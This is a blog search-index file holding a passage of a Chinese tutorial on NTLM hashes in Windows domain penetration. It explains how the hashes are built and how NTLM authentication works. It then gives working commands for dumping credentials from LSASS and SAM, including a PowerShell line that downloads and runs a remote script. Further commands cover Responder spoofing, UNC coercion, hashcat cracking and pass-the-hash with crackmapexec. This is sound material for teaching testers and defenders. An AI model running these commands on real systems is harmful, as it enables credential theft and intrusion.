<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>域渗透之NTML-Hash</title>
      <link href="/yu-shen-tou-zhi-ntml-hash/"/>
      <url>/yu-shen-tou-zhi-ntml-hash/</url>
      
        <content type="html"><![CDATA[<h1 id="一、认识Windows-HASH"><a href="#一、认识Windows-HASH" class="headerlink" title="一、认识Windows HASH"></a>一、认识Windows HASH</h1><p>​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。</p><p>​     NTLM-Hash与LM-Hash算法相比，明文口令大小写敏感，但无法根据NTLM-Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串<code>KGS!@#$%</code>。MD4是真正的单向哈希函数，穷举做为数据源出现的明文，难度较大。问题在于，微软一味强调NTLM-Hash的强度高，却避而不谈一个事实，为了保持向后兼容性，NTLM-Hash缺省总是与LM-Hash一起使用的。这意味着NTLM-Hash强调再高也是无助于安全的，相反潜在损害着安全性。增加NTLM-Hash后，首先利用LM-Hash的弱点穷举出原始明文口令的大小写不敏感版本，再利用NTLM-Hash修正出原始明文口令的大小写敏感版本</p><h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h2><p>​    <code>LM HASH</code>是一种较古老的Hash，在<code>LAN Manager</code>协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。</p><p><strong>补充：</strong></p><p><code>Windows Vista</code>和<code>Windows Server 2008</code>以前的系统还会使用LM hash。LM hash的生成方法本文暂不介绍。自Vista和2008开始，Windows取消LM hash，但某些工具的参数需要填写固定格式<code>LM hash:NT hash</code>，可以将LM Hash填0(LM hash可以为任意值)，即<code>00000000000000000000000000000000:NT hash</code></p><h2 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM HASH"></a>NTLM HASH</h2><p>​    <code>NTLM Hash（NT LAN Manager）</code>是支持<code>Net NTLM</code>认证协议及<code>本地认证</code>过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是<code>LM Hash</code>，目前基本淘汰，两者相差不大，只是使用的加密算法不同。</p><p><strong>本地认证</strong>：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在<code>SAM (Security Account Manager Database，安全账号管理数据库)</code>中。SAM文件的路径是<code>%SystemRoot%\system32\config\sam</code>。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。</p><blockquote><p>Note：类似的，在域环境下，DC (Domain Controller，域控制器)中也存在这样的数据库<code>AD (Account Database)</code>，位于<code>ntds.dit</code>文件</p></blockquote><p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p><p>通常意义上的<code>NTLM Hash</code>指存储在<code>SAM</code>数据库及<code>NTDS数据库</code>中对密码进行Hash摘要计算后的结果，这类Hash可以直接用于PTH，并且通常存在于<code>LSASS</code>进程中，便于SSP使用。</p><p>本地认证流程</p><pre><code>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</code></pre><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对比SAM数据库中的hash进行验证。</p><ul><li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li></ul><p>在系统中，hash格式是类似这样的：</p><pre class=" language-bash"><code class="language-bash">ssooking:1001:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::</code></pre><h2 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM-Hash的生成"></a>NTLM-Hash的生成</h2><p>用户密码为<code>test123</code></p><p>转换成十六进制的格式为<code>74657374313233</code></p><p>转换成Unicode格式为<code>7400650073007400310032003300</code></p><p>对字符串<code>7400650073007400310032003300</code>以十六进制格式作MD4加密，结果为<code>c5a237b7e9d8e708d8436b6148a25fa1</code></p><p><strong>注：</strong></p><p>MD4加密可使用工具HashCalc，如下图</p><p>IBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash便应运而生。假设明文口令是<code>123456</code>，首先转换成<code>Unicode</code>字符串，与LM Hash算法不同，这次不需要添加0补足14字节</p><p><code>123456</code> -&gt; <code>310032003300340035003600</code>。</p><blockquote><p>从<code>ASCII</code>串转换成Unicode串时，使用<code>little-endian(小端)</code>序。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00。</p></blockquote><p>对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，</p><p>16字节 <code>310032003300340035003600</code>- 进行标准MD4单向哈希 -&gt; <code>32ED87BDB5FDC5E9CBA88547376818D4</code>，</p><p>就得到了最后的NTLM Hash：<code>32ED87BDB5FDC5E9CBA88547376818D4</code></p><p>实验环境下，测试服务器可以先关闭密码复杂性策略，设置一个简单的密码。</p><blockquote><p>gpedit.msc – 本地组策略编辑器 – 计算机配置 - windows设置 - 安全设置 - 帐户策略 - 密码策略</p></blockquote><p>后文以Adminstrator NTML Hash 为例。明文密码为<code>toor</code></p><pre class=" language-bash"><code class="language-bash">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</code></pre><h1 id="二、NTML网络认证机制"><a href="#二、NTML网络认证机制" class="headerlink" title="二、NTML网络认证机制"></a>二、NTML网络认证机制</h1><h2 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h2><p>​    NTLM是除<code>Kerberos</code>之外的一种网络认证协议，只支持Windows。它是一种基于质询/应答 (Challenge/Response)消息交换模式的认证机制， 常用于<u>工作组</u>和<u>域环境</u>下<code>登录场景的身份认证</code>。</p><h2 id="基于NTML协议的身份认证机制"><a href="#基于NTML协议的身份认证机制" class="headerlink" title="基于NTML协议的身份认证机制"></a>基于NTML协议的身份认证机制</h2><p>​    NTML网络认证采用质询/应答 (Challenge/Response) 模式进行数据交换，通过传输加密的<code>Challenge/Response</code>值并进行对比，从而验证用户身份。NTML网络认证会使用用户密码的Hash作为密钥，来加密<code>Challenge</code>，用户只有在输对密码的情况下，才能够同样利用密码的hash进行解密。这样通过对比两端的计算结果来判断凭据是否有效，从而实现身份认证。这样的好处是，用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性。</p><p>通过交互过程中维护的<code>凭证（credential）</code>，包括域名、用户名、用户密码的hash串</p><blockquote><p>ps：域名信息会自动在数据包中携带，无需用户手动输入。</p></blockquote><p><strong>NTLM的认证过程</strong>分为三步：协商、质询、验证：</p><ul><li><strong>协商</strong>：主要用于确认双方协议版本</li><li><strong>质询</strong>：质询/应答 (Challenge/Response) 模式，用于消息交换</li><li><strong>验证</strong>：验证身份合法性，通常由Server端或域控制器完成这个过程</li></ul><p><strong>NTML的认证方式</strong>分为<code>Interactive（交互式）</code>和<code>Noninteractive（非交互式）</code>：</p><p><code>交互式验证</code>：交互式提供必要凭据，通常应用场景通常为登录，即用户要登录某台客户端。</p><p><code>非交互式验证</code>：无需交互式提供凭据，在实际应用中，比如命令行直接指定用户名、密码的方式登录，再比如我们在客户端上使用<code>net use</code>命令去映射服务器上某个共享文件夹的方式，这些便属于属于非交互式认证。但非交互式认证的应用场景更多的是<u><strong>已登录某客户端的用户去请求另一台服务器的资源</strong></u> ，或者为单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。</p><pre><code>net use x: \\17.10.0.10\$share /u:administrator password</code></pre><p>NTML认证机制在<code>工作组</code>环境下和在<code>域环境</code>下是不同的。</p><p>​    <strong>工作组</strong>和<strong>域</strong>宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。在认证体系中，工作组和域的主要区别在于，工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<code>点对点</code>的。因此，在工作组环境下进行访问认证，仅涉及<strong>Client</strong>和<strong>Server</strong>。我们使用的个人计算机，默认便处于WORKGROUP工作组环境下。</p><p>​    域是一个有安全边界的计算机集合，同一个域中的计算机通过<code>共同的第三方信任机构</code>建立信任关系，这个第三方信任机构角色由<code>DC (Domain Controller，域控制器)</code> 担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong> 。</p><blockquote><p>注意：在Windows域环境下涉及三方的<strong>访问认证</strong>场景中，即客户端想要访问服务器资源的情况下，采用 <strong>基于Kerberos协议的网络认证机制</strong>，<u>NTML认证机制参与认证过程</u>。此部分详细内容请参考<a href="">域渗透之Kerberos</a> 。</p></blockquote><p>​    下面我们就来分别介绍一下在工作组和域环境下，基于NTML协议的网络认证机制的工作流程。以交互式为例。</p><h2 id="工作组环境NTML认证流程"><a href="#工作组环境NTML认证流程" class="headerlink" title="工作组环境NTML认证流程"></a>工作组环境NTML认证流程</h2><p>工作组中，涉及Clinet、Server，流程如下：</p><ul><li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li><li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li><li>服务器生成一个16字节的随机数，称为<strong><em>质询</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>.aspx)，并将<em>challenge</em>发送给客户端</li><li>客户端使用缓存的<strong><em>用户密码的哈希值</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器。</li><li>服务器使用username从SAM帐户数据库中检索用户密码的hash，使用该hash来加密challenge，并与客户端计算的响应值进行比较。如果它们相同，则验证成功。</li></ul><h2 id="域环境NTML认证流程"><a href="#域环境NTML认证流程" class="headerlink" title="域环境NTML认证流程"></a>域环境NTML认证流程</h2><p>在域环境下多了域控制器的角色，微软给出的说明是这样的：</p><blockquote><ol><li>(Interactive  authentication only) A user accesses a client computer and provides a  domain name, user name, and password. The client computes a  cryptographic <a href="https://msdn.microsoft.com/en-us/library/ms721586(v=VS.85" target="_blank" rel="noopener"><em>hash</em></a>.aspx) of the password and discards the actual password.</li><li>The client sends the user name to the server (in <a href="https://msdn.microsoft.com/en-us/library/ms721603(v=VS.85" target="_blank" rel="noopener"><em>plaintext</em></a>.aspx)).</li><li>The server generates a 16-byte random number, called a <em>challenge</em> or <a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85" target="_blank" rel="noopener"><em>nonce</em></a>.aspx), and sends it to the client.</li><li>The client encrypts this challenge with the hash of the user’s  password and returns the result to the server. This is called the <em>response</em>.</li><li>The server sends the following three items to the domain controller:<ul><li>User name</li><li>Challenge sent to the client</li><li>Response received from the client</li></ul></li><li>The domain controller uses the user name to retrieve the hash of  the user’s password from the Security Account Manager database. It uses  this password hash to encrypt the challenge.</li><li>The domain controller compares the  encrypted challenge it computed (in step 6) to the response computed by  the client (in step 4). If they are identical, authentication is  successful.</li></ol></blockquote><p>翻译过来流程大致如下：</p><ol><li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li><li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li><li>服务器生成一个16字节的随机数，称为<strong><em>质询</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>.aspx)，并将<em>challenge</em>发送给客户端</li><li>客户端使用缓存的<strong><em>用户密码的哈希值</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器</li><li>服务器将<strong><em>Username、Challenge、Response</em></strong><code>（Net-NTML hash）</code>发送给<strong><em>DC (Domain Controller，域控制器)</em></strong></li><li>DC域控制器从<strong><em>AD (Account Database，帐户数据库)</em></strong> 中检索该用户名，并提取用户密码的NTML hash，使用该hash来加密challenge，并且把这个值和客户端计算的响应值进行比较。如果它们相同，则验证成功。</li></ol><h1 id="三、如何拿到Hash"><a href="#三、如何拿到Hash" class="headerlink" title="三、如何拿到Hash?"></a>三、如何拿到Hash?</h1><h2 id="1-本地获取"><a href="#1-本地获取" class="headerlink" title="1.本地获取"></a>1.本地获取</h2><p>在渗透测试中，通常可从Windows系统中的<code>SAM</code>文件和域控的<code>NTDS.dit</code>文件中获得用户hash，通过读取<code>lsass.exe</code>进程能获得已登录用户的NTLM hash。许多工具能够方便地为我们完成这些工作。但需要注意的是：</p><blockquote><p>大部分这种本地抓取hash的工具都需要管理员权限</p></blockquote><p>常用工具：</p><ul><li><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&amp;can=2&amp;q=" target="_blank" rel="noopener">QuarksPwDump</a></li><li><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></li><li><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></li><li><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></li><li>Cobaltstrike</li></ul><h3 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&amp;can=2&amp;q=" target="_blank" rel="noopener">QuarksPwDump</a></h3><pre class=" language-bash"><code class="language-bash">quarkspwdump.exe -dhl</code></pre><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h3><pre class=" language-bash"><code class="language-bash">privilege::debugsekurlsa::logonpasswords</code></pre><p>更方便的mimikatz命令</p><pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords full"</span></code></pre><p>执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：</p><pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">""</span>privilege::debug<span class="token string">""</span> <span class="token string">""</span>log sekurlsa::logonpasswords full<span class="token string">""</span> <span class="token keyword">exit</span></code></pre><h3 id="ProDump"><a href="#ProDump" class="headerlink" title="ProDump"></a><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></h3><p><code>prodump</code>是微软提供的一个命令行实用程序，用于监视应用程序并生成故障转储。我们可以用它先dump对方主机的<code>LSASS</code>内存文件，然后在自己主机用<code>mimikatz</code>等工具进行处理。这种方式的好处是可以避免被查杀。先转储<code>LSASS</code>内存文件：</p><pre class=" language-bash"><code class="language-bash">procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>然后本地用<code>mimikatz</code>对<code>LSASS</code>内存文件进行破解：</p><pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">"sekurlsa::minidump lsass.dmp"</span>sekurlsa::logonpasswords</code></pre><p>类似<code>ProDump</code>的工具还有：<strong>fgdump</strong>、<strong>pwdump</strong>、<strong>cachedump</strong>等。利用powershell也能够像<code>Prodump</code>一样转储lsass文件：</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token string">"Get-Process lsass | Out-Minidump"</span></code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></h3><p>首先需要获取<code>SYSTEM</code>权限</p><pre class=" language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuidmeterpreter <span class="token operator">></span> getsystem<span class="token punctuation">..</span>.got system via technique 1 <span class="token punctuation">(</span>Named Pipe Impersonation <span class="token punctuation">(</span>In Memory/Admin<span class="token punctuation">))</span>.meterpreter <span class="token operator">></span> getuidServer username: NT AUTHORITY\SYSTEM</code></pre><p>在<code>metasploit</code>中利用<code>mimikatz</code>获取hash</p><pre class=" language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load mimikatzmeterpreter <span class="token operator">></span> mimikatz_command -f samdump::hashes</code></pre><p><code>metasploit</code>提供的抓取hash的一些模块：</p><pre class=" language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> run post/windows/gather/hashdumpmeterpreter <span class="token operator">></span> run post/windows/gather/smart_hashdump</code></pre><p><code>smart_hashdump</code>模块会把dump的hash文件保存在<code>/root/.msf4/loot</code>目录下，并且该模块一定程度上能够绕过<code>windows UAC</code>。</p><p>顺便介绍一些能够直接获取明文密码的模块命令：</p><pre class=" language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load mimikatzmeterpreter <span class="token operator">></span> wdigest （kerberos）meterpreter <span class="token operator">></span> mimikatz_command -f samdump::hashesmeterpreter <span class="token operator">></span> mimikatz_command -f sekurlsa::searchPasswords meterpreter<span class="token operator">></span>load kiwimeterpreter<span class="token operator">></span> creds_wdigest</code></pre><h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h3><pre><code>beacon&gt; getuidbeacon&gt; powershell-import /root/powershell/Get-PassHashes.ps1beacon&gt; powershell Get-PassHashes</code></pre><p> 读取hash，需要administer权限(右击目标主机–<code>Access</code>-<code>hashdump</code>)</p><pre class=" language-bash"><code class="language-bash">beacon<span class="token operator">></span> wdigest //读取信息beacon<span class="token operator">></span> hashdump  </code></pre><p>运行mimikatz(右击目标主机–<code>Access</code>- <code>RUN mimikatz</code>)</p><pre class=" language-bash"><code class="language-bash">beacon<span class="token operator">></span> logonpasswords </code></pre><p>右击受害者主机–access-hashdump</p><pre class=" language-bash"><code class="language-bash">beacon<span class="token operator">></span> powershell-import /root/powershell/Inveigh/Inveigh.ps1beacon<span class="token operator">></span> powershell Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -PROXY Y</code></pre><h2 id="2-网络欺骗"><a href="#2-网络欺骗" class="headerlink" title="2.网络欺骗"></a>2.网络欺骗</h2><p>通常我们采用网络欺骗技术，配合受害者交互的方式窃取到是Net-NTLM Hash。这类hash并不能直接用于<code>pass-the-hash</code>攻击，但可以通过暴力破解的方式来获取明文密码。关于更多获取<code>Net-NTML HASH</code>的技巧，可以参考</p><p>常用工具：</p><ul><li>Responder</li><li>Metasploit</li></ul><h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p><code>responder</code>可以伪造服务，对相关请求进行响应。开启命令：</p><pre class=" language-bash"><code class="language-bash">responder -I eth0</code></pre><p>实战环境下，我们应该修改<code>/etc/responder/Responder.conf</code>配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">;</span> Servers to startSQL <span class="token operator">=</span> OffSMB <span class="token operator">=</span> OnKerberos <span class="token operator">=</span> OnFTP <span class="token operator">=</span> OffPOP <span class="token operator">=</span> OffSMTP <span class="token operator">=</span> OffIMAP <span class="token operator">=</span> OffHTTP <span class="token operator">=</span> OnHTTPS <span class="token operator">=</span> OnDNS <span class="token operator">=</span> OnLDAP <span class="token operator">=</span> On</code></pre><p>针对测试而言，我们还可以设置<code>Challenge</code>值，以便观察流量格式：</p><pre><code>Challenge = 1122334455667788</code></pre><p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204130140.png" alt=""></p><p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。<code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code>   <code>SMBv2-NTLMv2</code>等前缀开头。</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204130759.png" alt=""></p><p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p><ul><li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li><li>钓鱼文档：doc、docx、pdf</li><li>后门设置：</li></ul><p>例：</p><pre><code>regsvr32 /s /u /i://17.10.0.1/@abc hello.dllpowershell -c &quot;Invoke-Item \\17.10.0.1\aa&quot;powershell -nop -exec bypass -c &quot;Invoke-Item \\17.10.0.1\aa&quot;Invoke-Item \\192.168.0.1\aaGet-Content \\192.168.0.1\aaStart-Process \\192.168.0.1\aa </code></pre><h2 id="3-其他技巧"><a href="#3-其他技巧" class="headerlink" title="3.其他技巧"></a>3.其他技巧</h2><p>还有许多其他<code>Credential Dumping</code>姿势，可以参考：</p><p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">dumping-domain-password-hashes</a></p><p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">Places of Interest in Stealing NetNTLM Hashes</a> 及译文 <a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">花式窃取NetNTLM哈希的方法</a></p><h1 id="四、如何利用Hash？"><a href="#四、如何利用Hash？" class="headerlink" title="四、如何利用Hash？"></a>四、如何利用Hash？</h1><p>在拿到hash之后，我们一般会考虑破解出hash明文密码，或者利用<code>pass-the-hash</code>技术在无需明文密码的情况下进行特权操作。</p><h2 id="1-解密Hash"><a href="#1-解密Hash" class="headerlink" title="1.解密Hash"></a>1.解密Hash</h2><h3 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h3><p>下面是一些提供在线解密的站点：</p><ul><li><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></li><li><a href="https://crack.sh/get-cracking/" target="_blank" rel="noopener">https://crack.sh/get-cracking/</a></li><li><a href="http://hashcrack.com/index.php" target="_blank" rel="noopener">http://hashcrack.com/index.php</a></li><li><a href="http://cracker.offensive-security.com/index.php" target="_blank" rel="noopener">http://cracker.offensive-security.com/index.php</a></li><li><a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a></li></ul><h3 id="本地破解"><a href="#本地破解" class="headerlink" title="本地破解"></a>本地破解</h3><p>我们还可以使用<code>john</code>、<code>hashcat</code>等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。</p><h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><pre class=" language-bash"><code class="language-bash">john HTTP-NTLMv2-17.10.0.10.txt</code></pre><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204134230.png" alt=""></p><h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>使用<code>hashcat -h</code>命令查看帮助，必要的参数有：</p><p><code>-m</code>  hash类型</p><pre class=" language-bash"><code class="language-bash">LM：3000 NTLM：1000NetNTLMv1：5500NetNTLMv2：5600 </code></pre><p>NTLMv1的格式为：</p><pre class=" language-bash"><code class="language-bash">username::hostname:LM response:NTLM response:challenge</code></pre><p>构造后的数据如下：</p><pre class=" language-bash"><code class="language-bash">log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee</code></pre><p>Hashcat参数如下：</p><pre class=" language-bash"><code class="language-bash">hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force</code></pre><p>下面，使用Hashcat对该Net-NTLM hash进行破解。NTLMv2的格式为：</p><pre class=" language-bash"><code class="language-bash">username::domain:challenge:HMAC-MD5:blob</code></pre><blockquote><p>值得一提的是，在真实渗透环境下，由于密码复杂度限制，一般我们获取到的<code>NTML-HASH</code>很难直接破解出明文密码，这种情况下我们需要采用其他技术继续进行横向渗透。</p></blockquote><h2 id="2-Pass-The-Hash"><a href="#2-Pass-The-Hash" class="headerlink" title="2.Pass-The-Hash"></a>2.Pass-The-Hash</h2><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。渗透中当我们获取不到明文密码，或者破解不了NTLM Hash的情况下，哈希传递攻击能够使我们利用这些哈希继续进行横向渗透。</p><p>常用<code>Pass-The-Hash</code>工具： </p><ul><li>Crackmapexec</li><li>Mimikatz</li><li>smbmap</li><li>smbexec</li><li>metasploit</li><li>cobaltstrike</li></ul><h3 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></h3><p>1.安装 crackmapexec</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> crackmapexec<span class="token punctuation">(</span>pip <span class="token function">install</span> crackmapexec<span class="token punctuation">)</span></code></pre><p>2.使用 crackmapexec</p><pre class=" language-bash"><code class="language-bash">cme smb -h</code></pre><p>批量扫描探测命令：</p><pre class=" language-python"><code class="language-python">cme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.10</span><span class="token operator">/</span><span class="token number">24</span>cme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.10</span> <span class="token operator">-</span>u administrator <span class="token operator">-</span>H hash<span class="token punctuation">.</span>txtcme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.100</span><span class="token operator">-</span><span class="token number">200</span> <span class="token operator">-</span>u administrator <span class="token operator">-</span>H AFC44EE7351D61D00698796DA06B1EBF</code></pre><p>执行命令：</p><pre class=" language-python"><code class="language-python">cme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.10</span>  <span class="token operator">-</span>u administrator <span class="token operator">-</span>p toor<span class="token punctuation">(</span>明文密码<span class="token punctuation">)</span> <span class="token operator">-</span>x whoamicme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.10</span>  <span class="token operator">-</span>u administrator <span class="token operator">-</span>H afc44ee7351d61d00698796da06b1ebf <span class="token operator">-</span>x whoami</code></pre><p>其他参数</p><pre class=" language-bash"><code class="language-bash">--shares    <span class="token comment" spellcheck="true">#枚举共享和访问权限</span>--sessions    <span class="token comment" spellcheck="true">#枚举活动会话</span>--disks        <span class="token comment" spellcheck="true">#枚举磁盘</span>--sam         <span class="token comment" spellcheck="true">#dump目标系统中的SAM哈希值</span>--loggedon-users    <span class="token comment" spellcheck="true">#枚举登录用户</span>--users <span class="token punctuation">[</span>USER<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#枚举域用户(如果指定了用户只查询其信息)</span>--groups <span class="token punctuation">[</span>GROUP<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#枚举域组(如果指定了组其成员被列举)</span>--local-groups <span class="token punctuation">[</span>GROUP<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#如果指定了组则枚举本地组其成员被列举</span>--local-groups <span class="token punctuation">[</span>GROUP<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#枚举本地组，如果指定了组，则枚举其成员</span>-x COMMAND                <span class="token comment" spellcheck="true">#执行指定的命令</span>-X PS_COMMAND            <span class="token comment" spellcheck="true">#执行指定的PowerShell命令</span>-L， --list-modules    <span class="token comment" spellcheck="true">#列出可用的拓展功能模块</span>--options    <span class="token comment" spellcheck="true">#查看模块选项</span>-M MODULE， --module MODULE     <span class="token comment" spellcheck="true">#使用拓展功能模块</span>-o MODULE_OPTION <span class="token punctuation">[</span>MODULE_OPTION <span class="token punctuation">..</span>.<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#设置模块选项</span></code></pre><p>GETSHELL</p><p>利用拓展功能模块，我们可以方便地getshell。我们可以使用<code>cme smb -L</code>命令查看所有<code>moudules</code>，对应的物理路径为：</p><pre class=" language-python"><code class="language-python"><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token 